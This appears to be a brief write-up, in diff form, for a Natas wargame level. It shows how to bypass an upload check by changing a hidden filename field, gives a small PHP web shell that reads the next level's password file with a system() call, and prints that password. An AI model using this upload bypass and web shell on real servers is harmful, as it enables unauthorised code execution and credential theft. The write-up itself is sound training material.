@@ -1,0 +1,16 @@
+Interestingly User Can Control File Extension, By manipulating form hidden filename data feild value extension.
+
+So, Just create a file test.php
+:~/Desktop$ cat test2.php 
+<?php
+// Just want my next level key
+$output = system('cat /etc/natas_webpass/natas13');
+echo '<pre>'.$output.'</pre>';
+?>
+
+
+Save it, Upload it and Then visit it.
+
+Username : natas13
+Password : jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
